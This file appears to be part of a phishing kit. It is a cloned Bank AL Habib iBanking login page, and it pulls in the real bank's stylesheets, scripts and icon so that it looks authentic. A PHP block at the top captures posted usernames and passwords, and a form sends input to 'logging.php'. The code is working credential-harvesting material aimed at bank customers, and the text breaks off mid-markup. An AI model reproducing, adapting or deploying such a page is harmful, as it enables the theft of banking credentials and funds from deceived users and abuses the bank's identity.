<?php
$username = $_POST['username'];
$password = $_POST['password'];
?>


<!DOCTYPE html>
<html>
	<head>
	<title>Bank AL Habib Ltd - iBanking</title>
	<meta http-equiv="cache-control" content="no-cache"> 
	<meta http-equiv="cache-control" content="no-store"> 
	<meta http-equiv="Pragma" content="no-cache"> 
	<meta http-equiv="Expires" content=0>
	<meta http-equiv="X-UA-Compatible" content="IE=11">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="1024, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=2.0" />
	<meta name="apple-mobile-web-app-capable" content="yes" />
	<meta name="apple-mobile-web-app-status-bar-style" content="default" />
	<meta name="HandheldFriendly" content="true" />
	<meta name="MobileOptimized" content="width" />
	


<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<link type="text/css" rel="stylesheet" href="https://secure.bankalhabib.com/T001/css/cmn/banking.uri.css" />
<link type="text/css" rel="stylesheet" href="https://secure.bankalhabib.com/T001/css/C_COLPAL1/scrollbars.uri.css" />
<link type="text/css" rel="stylesheet" href="https://secure.bankalhabib.com/T001/css/cmn/virtualkeyboard.uri.css" />
<link rel="shortcut icon" href="https://secure.bankalhabib.com/T001/images/oraclefav.ico" />

<script type="text/javascript" src="https://secure.bankalhabib.com/T001/JS/combined/jquery-includes.js" charset="utf-8"></script>
<script type="text/javascript" src="https://secure.bankalhabib.com/T001/jsdir/common.js" charset="utf-8"></script>
<script type="text/JavaScript" src="https://secure.bankalhabib.com/T001/jsdir/virtualkeyboard.js" charset="utf-8"></script>
<script type="text/JavaScript" src='https://secure.bankalhabib.com/T001/jsdir/rsa_compiled.js' charset="utf-8"></script>
<script type="text/JavaScript" src='https://secure.bankalhabib.com/T001/jsdir/fb.js' charset="utf-8"></script>
	 
<script type="text/javascript">
	$(document).ready(function() {
		//$('#a1_up').bubbletip($('#tip1_up'));
		//$('#a2_up').bubbletip($('#tip2_up'));
		
		$('.manual-ajax').click(function(event) {
		      event.preventDefault();
		      $.get(this.href, function(html) {
		        $(html).appendTo('body').modal();
		      });
		    });
			    
		$(window).resize(function(){
			 if(window.screen.width <= 800) { 
				  $('#wrapper').attr('style', 'width: 95%');
				  $('#wrapper #section').attr('style', 'width: 95%');
				  $('#wrapper #section.login').attr('style', 'width: 68%');
				  $('#wrapper #section.savings_account').attr('style', 'width: 68%');
				  $('.virtualButtons').attr('style', "width:24px;height:24px");
				  $('#login-keyboard-controls input').attr('style', 'height:24px');
				  $('.header_nav').attr('style', 'width: 99%');
				  $('#footer').attr('style', 'width: 95%');
			 } else { 
				  $('#wrapper').removeAttr('style');
				  $('#wrapper #section').removeAttr('style');
				  $('#wrapper #section.login').removeAttr('style');
				  $('#wrapper #section.savings_account').removeAttr('style');
				  $('.virtualButtons').removeAttr('style');
				  $('#login-keyboard-controls input').removeAttr('style');
				  $('.header_nav').removeAttr('style');
				  $('#footer').removeAttr('style');
			 }
			 
	  }).trigger('resize');
	  initialize_fb ({appId : 'null', channelURL : 'null'});
	});
	
	function passwordStrength(i)
	{
		var password = document.getElementById('pass0'+i).value;
		var desc = new Array();
		desc[0] = "Very Weak";
		desc[1] = "Weak";
		desc[2] = "Better";
		desc[3] = "Medium";
		desc[4] = "Strong";
		desc[5] = "Strongest";

		var score   = 0;
		//if password bigger than 6 give 1 point
		if (password.length > 6) score++;

		//if password has both lower and uppercase characters give 1 point	
		if ( ( password.match(/[a-z]/) ) && ( password.match(/[A-Z]/) ) ) score++;

		//if password has at least one number give 1 point
		if (password.match(/\d+/)) score++;

		//if password has at least one special caracther give 1 point
		if ( password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/) )	score++;

		//if password bigger than 12 give another 1 point
		if (password.length > 12) score++;

		
		
		 document.getElementById("passwordDescription"+ i).innerHTML = desc[score];
		 
		 document.getElementById("passwordStrength"+ i).className = "strength" + score;
	}
</script>

	<script type="text/javascript" src="https://secure-bah.bankalhabib.com/T001/JS/combined/jquery-includes.js" charset="utf-8"></script>
	 
 
 
 <!--Girish Added for Browser compatibility error -->
	<!-- Added By Prashant to move security tips pop up on banking.jsp from home.jsp -->
	<!--Prashant Start-->
	<style>
	#popup_box {
  position: relative;
  width: 70%;
  height: auto;
  font-weight: bold;
  left: 15%;
  top: 5%;
  right: 15%;
  z-index: 100;
  padding: 30px;
  font-size: 15px;
  overflow: auto;
   background-color: #fff;
  border: 10px solid #227c32;
  box-shadow: 0px -1px 24px -4px #8e8e8e;
  border-radius: 0px;
}
#container {     
		background: #CCC;
		width:100%;     
		height:65%; 
	
		}  
		a{   
		cursor: pointer;   
		text-decoration:none; 
    color: #663131;		
		}   
p { padding-left:0px  !important}
.popUpTbl p { padding:3px; font-size:12px;  margin-left: 22px;}
.popUpTbl h1 { color:green; font-size:26px; text-decoration:underline; text-transform:uppercase; padding:0px;  text-align: CENTER;margin-top: 0px;}
.popUpTbl ul { padding:0 0 0 30px; margin-top:8px;}
.list {margin:0 0 20px; padding:0 0 0 30px;}
.list li {/*font-size:12px; color:#666;*/}
.list li {
    font-size: 12px;
  color: #000;
  list-style-type: square;
  margin: 8px;
  font-weight: 300;
  
}
.list li strong {color:#000;}
.head { padding: 10px 0 0 !important;font-size: 15px !important; font-weight: bold;}
{
  font-size: 12px;
  line-height: 15px;
  right: 28%;
  position: absolute;
  color: #6fa5e2;
  font-weight: 500;
  text-align: center;
  top: 98%;
  width: 600px;
}
#popupBoxClose input {
	padding:3px 5px;
	  padding: 3px 5px;
  width: 100px;
  margin-left: 20px;
  background-color: #ffc000;
  -webkit-box-shadow: 1px 1px 6px rgba(0,0,0,.25);
  -moz-box-shadow: 1px 1px 6px rgba(0,0,0,.25);
  box-shadow: 1px 1px 6px rgba(0,0,0,.25);
  background-image: -webkit-linear-gradient(bottom, rgba(0,0,0,.18), rgba(255,255,255,.18));
  background-image: -moz-linear-gradient(bottom, rgba(0,0,0,.18), rgba(255,255,255,.18));
  background-image: -o-linear-gradient(bottom, rgba(0,0,0,.18), rgba(255,255,255,.18));
  background-image: -ms-linear-gradient(bottom, rgba(0,0,0,.18), rgba(255,255,255,.18));
  background-image: linear-gradient(to top, rgba(0,0,0,.18), rgba(255,255,255,.18));
  font-size: 12px;
  font-weight: bold;
}
#overlay
{
		position: fixed;
		height: 100%;
		width: 100%; 
		background-color: #fffddd;
		opacity: 0.4;
}
#prj_desc
{
		background-color:rgba(0,0,0,0.5);
		width:100%;
		height:100%;
		position:absolute;
		top:0px;
		left:0px;
		z-index:5;
}
#imp_info
{
margin-left: 210px;
position:relative;
top:0px;
text-decoration:underline;
}
#bank_logo
{
top:10px;
position:absolute;
margin-left:100px;
}

.privacy {
  font-size: 12px;
  font-weight: 300;
  display: inline-block;
}
b{color:red;font-weight:bold;}
		#popupBoxClose1 input {
					padding:3px 5px;
					  padding: 3px 5px;
				  width: 100px;
				  margin-left: 20px;
				  background-color: #ffc000;
				  -webkit-box-shadow: 1px 1px 6px rgba(0,0,0,.25);
				  -moz-box-shadow: 1px 1px 6px rgba(0,0,0,.25);
				  box-shadow: 1px 1px 6px rgba(0,0,0,.25);
				  background-image: -webkit-linear-gradient(bottom, rgba(0,0,0,.18), rgba(255,255,255,.18));
				  background-image: -moz-linear-gradient(bottom, rgba(0,0,0,.18), rgba(255,255,255,.18));
				  background-image: -o-linear-gradient(bottom, rgba(0,0,0,.18), rgba(255,255,255,.18));
				  background-image: -ms-linear-gradient(bottom, rgba(0,0,0,.18), rgba(255,255,255,.18));
				  background-image: linear-gradient(to top, rgba(0,0,0,.18), rgba(255,255,255,.18));
				  font-size: 12px;
				  font-weight: bold;
		}

		#popup_box1 {     
				display:none; 
				position:fixed;
				width:70%;       
				height:65%; 
				background:#efefef;	
				font-weight:bold;
				left: 15%;     top: 5%;   right: 15%;  z-index:100; 
				border:1px solid ;           
				padding:30px;       
				font-size:15px;       
				overflow: auto;   
				-moz-box-shadow: 0 0 5px #ff0000;    
				-webkit-box-shadow: 0 0 5px #ff0000;     
				box-shadow: 0 0 5px ;     	
		}
				
		#popupBoxClose1 {     
				font-size:20px;       
				line-height:15px;       
				right: 20px;       
				position:absolute;       
				color:#6fa5e2;       
				font-weight:500;       
		}  
		#popupBoxClose1 input {
			padding:3px 5px;
		}

		#imp_info1
		{
			margin-left: 210px;
			position:relative;
			top:0px;
			text-decoration:underline;
		}

		#bank_logo1
		{
			top:10px;
			position:absolute;
			margin-left:100px;
		}
.vedios {
    background: #fff !important;
     border: 10px solid #227c32 !important;
   /* top: 107px !important;*/
      overflow-x: hidden !important;
    height: 81% !important;
    box-shadow: 0px 3px 8px 3px #f1f1f1 !important;
}
.buttons {
    /* right: 0px; */
    position: relative !important;
    float: right;
    left: -23px !important;
    text-align: left;
    margin: -25px;
    /* margin-left: -32px; */
    /* right: 42px; */
   top: 88%;
}
.full-screen{background-image: url(data:image/PNG;base64,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);
width:100px;height:100px;position: absolute;
    background-repeat: no-repeat;
    top: 90%;
    left: 61%;



}
/* responsive */
@media only screen and (max-width: 1107px){

.popUpTbl h1 {
    color: green;
    font-size: 17px;
    padding: 20px;
}
#popup_box {position: relative;width: 90%; left: 0px;top: 0px;right: 0px;padding: 0px;margin: 0px auto;}
.privacy {
    font-size: 12px;
    font-weight: 300;
    display: inline;
}
div#popupBoxClose {
    margin-top: 90px;
	padding-bottom: 20px;
}
.vedios {
    display: none !important;
}

}
@media only screen and (max-width: 900px){
	
	.sep{display:none;}
	
}

/* responsive */

</style>
<!--Prashant End-->

	<script type="text/javascript">
		//-----------------------------------------------------------------------------
		var scr_w, scr_w1,scr_h, scr_h1;
		//-----------------------------------------------------------------------------			
		$(document).ready(function() {
			   
			if($('div#fldLoginUserId input').val() == '') {
				$(location).attr('href','savings_account_offers.jsp');
			} 
			
			setScreenSize ();
		
		});
		//-----------------------------------------------------------------------------
		function fLogon(){
			   
			$(location).attr('href','retrieve_application.jsp');
			
			if(document.getElementById('fldLoginUserId').value =='tim.brown@gmail.com'){
				
				$(location).attr('href','savings_account_offers.jsp');
			}
			
		}
		//-----------------------------------------------------------------------------
		function setScreenSize(){
			
			scr_w1 = screen.availWidth-10+"px";
			scr_h1 = screen.availHeight-60+"px";
		}
		//-----------------------------------------------------------------------------
		function locateBranches(title) {
			document.frmprocess.fldRequestId.value = "RRLOB01";
			window_open (document.frmprocess, title, "RRLOB01");
		}
		//-----------------------------------------------------------------------------
		function  registerUser(title){
			document.frmprocess.fldRequestId.value = "RRRNB01";
			window_open (document.frmprocess, title, "RRRNB01");
		}
		function  opengoal(title){
			document.frmprocess.fldRequestId.value = "RRORG351";
			window_open (document.frmprocess, title, "RRORG351");
		}
		//-----------------------------------------------------------------------------
		function showFAQ(p_title, p_lang){
			window.open(p_lang + '/faq.html');				
		}
		//------------------------------------------------------------------------------
		function getStatus(title){
			document.frmprocess.fldRequestId.value = "RRORG111";
			window_open (document.frmprocess, title, "RRORG111");
		}
		
		//------------------------------------------------------------------------------
		function window_open(frm, title, id){
			var window_name = 'process_' + id;
			var frm_action;
			window.open (
				''
			,	window_name
			,	'toolbar=0,location=0,directories=0,status=1,menubar=0,scrollbars=1,resizable=0,left=0,top=0,width='+scr_w1+',height='+scr_h1
			);
			frm.target = window_name;
			frm.title.value = title;
			frm_action = frm.action;
			frm.action = "process.jsp"
			frm.submit ();
			frm.action = frm_action;
		}
		//------------------------------------------------------------------------------
		function aboutbox () {
			window.open ("about.html", "NewWindow",
					"dependant=no,directories=no,location=no,menubar=no"
				+	",resizable=no,scrollbars=yes,titlebar=no,toolbar=no,"
				+ "0, 0, top=0,left=0,status=1,width=400,height=300");
		}
		//-----------------------------------------------------------------------------
		
		function extractFieldsFromURL(){
			var fields=new Object();
			var url = new String(document.URL);
			var fieldStartPos = url.indexOf("?") + 1;
			if(fieldStartPos>0 && url.substring(fieldStartPos).length>0){
				var fields = url.substring(fieldStartPos).split("&");
				for(i=0; i<fields.length; i++){
					var field = fields[i].split("=");
					if(field.length == 2 && field[0].length>0){
						var fieldName = field[0];
						var fieldValue = field[1];
						if($('input[name="' + fieldName +'"]').val() == undefined){
							createHiddenField(fieldName, fieldValue);
						}
					}
				}
			}
			$('#fldLoginUserId').focus();
		}
		//-----------------------------------------------------------------------------
		function createHiddenField(fieldName, fieldValue){
			fieldElem = $('<input type="hidden" name="' + fieldName + '" value="' + fieldValue + '"/>');
			$('form[name="frmmain"]').append(fieldElem);
		}		
		//-----------------------------------------------------------------------------

/* Added By Prashant to move security tips pop up on banking.jsp from home.jsp */
/*   Prashant Start    */
$(document).ready(function() {

	$("#bwDialog").dialog({
		autoOpen : false,
		modal : false,
		draggable : false,
		resizable : false,
		closeOnEscape : false,
		buttons: {
			OK: function() {
							
			}
		},
		open: function(event, ui) {
			$(this).parent().children().children("a.ui-dialog-titlebar-close").remove();
		}
	});
		
        loadPopupBox();
         $('#popupBoxClose').click( function() {            
		
        	 if($('#id1').prop('checked')){
			    unloadPopupBox();
				
				}
        	 else
        		 alert("Please accept terms and conditions");
		
        });
		$('#popupBoxClose1').click( function() {            
		     	 
			    unloadPopupBox1();
				
				
			
        });
		
		// getting window.loc.href for iframe
		var path = window.location.href;
  var index = path.lastIndexOf('/');
  path = path.substring(0, index+1);
  path=path+"main-video.htm";
		$('#iframe1').attr('src',path);
		
		//--------------------------------------------------------------------------------
	
});

function unloadPopupBox() {    

$('#popup_box').fadeOut("slow");
$("#container").css({ 
        "opacity": "1"  
}); 
		$('#prj_desc').hide();
		//loadPopupBox1();
}
function loadPopupBox() {   
$('#popup_box').fadeIn("slow");
$("#container").css({
        "opacity": "0.3"  
    });         
}

function loadPopupBox1() {   
$('#popup_box1').fadeIn("slow");
$("#container").css({
        "opacity": "0.3"  
    });         
}
function unloadPopupBox1() {    

$('#popup_box1').fadeOut("slow").remove();
$("#container").css({ 
        "opacity": "1"  
}); 
		$('#prj_desc').hide();
		
}

	/*   Prashant End   */
		</script>
	</head>
	
	<body class="bg">
			




<div id="headerWrapper">
	<div id="header">
		<div id="_topMenu">
		<!--<div id='logoWrapper'>
			<div id="logo" class="logo"></div>
		</div>
		<div class="inner-head">
			<span>Call for free on :</span>1-800-111-1111
		</div>-->
		
		
		<form name="frmlang" method="POST" action="logging.php">
			<div id="topMenu">
				<ul>
